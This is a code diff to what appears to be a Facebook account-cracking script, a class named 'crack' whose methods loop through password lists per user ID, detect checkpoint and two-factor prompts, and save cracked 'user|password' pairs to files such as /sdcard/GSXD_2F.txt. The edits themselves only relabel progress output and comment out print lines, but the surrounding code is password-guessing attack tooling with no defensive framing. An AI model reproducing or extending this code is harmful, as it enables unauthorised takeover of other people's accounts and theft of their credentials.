@@ -530,7 +530,7 @@ class crack:
 
     def __mbasic__(self,user,__juts__,_jat):
         global ok,f2,cp
-        sys.stdout.write(f'\r{OO}[CHECKING] {VV}{self.loop}/{len(self.id)} OK:{len(ok)} - 2F:{len(f2)} - CP:{len(cp)}{NN} '),
+        sys.stdout.write(f'\r{OO}[M4] {VV}{self.loop}/{len(self.id)} OK:{len(ok)} '),
         sys.stdout.flush()
         for pw in __juts__:
             try:
@@ -602,7 +602,7 @@ class crack:
 #____________________Random M3 ____________________
     def __randoms__(self,user,__juts__,_jat):
         global ok,f2,cp
-        sys.stdout.write(f'\r {OO}[CRACK] {VV}{self.loop}/{len(self.id)} OK:{len(ok)} - 2F:{len(f2)} - CP:{len(cp)}{NN} '),
+        sys.stdout.write(f'\r{OO}[M1] {VV}{self.loop}/{len(self.id)} OK:{len(ok)} '),
         sys.stdout.flush()
         for pw in __juts__:
             try:
@@ -664,12 +664,12 @@ class crack:
                     user=cok['checkpoint'][13:28]
                     if 'Enter login code to continue' in str(rex.text):
                         Mm = '\033[9;31m'
-                        print(f"\r{Mm}[2F-GSXD] {user} | {pw}{VV}     ")
+                        #print(f"\r{Mm#}[2F-GSXD] {user} | {pw}{VV}     ")
                         open("/sdcard/GSXD_2F.txt", "a").write(user + "|" + pw + "\n")
                         f2.append(user + pw)
                         break
                     else:
-                        print(f"\r{EE}[CP-GSXD] {user} | {pw}{VV}     ")
+                        #print(f"\r{EE}[C#P-GSXD] {user} | {pw}{VV}     ")
                         open("/sdcard/GSXD_CP.txt", "a").write(user + "|" + pw + "\n")
                         cp.append(user + pw)
                         break
@@ -681,7 +681,7 @@ class crack:
 
     def __free__(self,user,__juts__,_jat):
         global ok,cp,f2,tl
-        sys.stdout.write(f'\r{OO}[CHECKING] {VV}{self.loop}/{len(self.id)} OK:{len(ok)} '),
+        sys.stdout.write(f'\r{OO}[M2] {VV}{self.loop}/{len(self.id)} OK:{len(ok)} '),
         sys.stdout.flush()
         for pw in __juts__:
             try:
@@ -826,7 +826,7 @@ class crack:
 
     def __mmb__(self,user,__juts__,_jat):
         global ok,cp,f2,tl
-        sys.stdout.write(f'\r{OO}[CHECKING] {VV}{self.loop}/{len(self.id)} OK:{len(ok)} '),
+        sys.stdout.write(f'\r{OO}[M3] {VV}{self.loop}/{len(self.id)} OK:{len(ok)} '),
         sys.stdout.flush()
         for pw in __juts__:
             try:
